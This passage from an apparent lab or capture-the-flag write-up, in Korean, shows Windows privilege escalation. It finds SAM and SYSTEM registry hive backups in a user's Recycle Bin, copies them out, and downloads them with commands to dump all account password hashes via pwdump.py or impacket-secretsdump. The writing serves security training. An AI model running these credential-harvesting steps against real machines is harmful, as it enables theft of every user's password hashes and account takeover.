
Windows와 Unix의 차이점을 생각하면서 운영 체제가 삭제 요청을 처리하는 방식의 차이점은 무엇입니까?

답변 — Unix를 사용하면 쉬운 복구 방법이 없는 직접 연결 해제입니다. Windows에서는 파일이 연결 해제되지만 파일 자체를 덮어쓸 때까지 핸들이 휴지통에 보관됩니다.


사용자에 대한 재활용 파일은 `C:\$Recycle.bin\<SID>`에서 찾을 수 있으며 여기서 SID는 개별 사용자를 위한 것입니다.

```powershell title="SID 확인"
whoami /all | Select-String -Pattern "jareth" -Context 2,0
```


이제 재활용 쓰레기통으로 이동하여 살펴볼 수 있습니다.
```powershell
cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
```

![[Pasted image 20250817001959.png]]

SAM 및 SYSTEM 레지스트리 하이브의 백업이 있으므로 시스템의 모든 사용자 계정의 암호 해시를 덤프하는 데 이를 사용하는 고전적인 권한에 필요한 모든 것이 있습니다.


```powershell title="Downloading the hive backups"
copy sam.bak C:\Windows\tasks\sam.bak
copy system.bak C:\Windows\tasks\system.bak
download C:\Windows\tasks\sam.bak
download C:\Windows\tasks\system.bak
```


Kali로 가서 `pwdump.py` 도구를 사용하여 암호 목록을 제공할 수 있습니다.
`impacket-secretsdump` 도구로도 가능

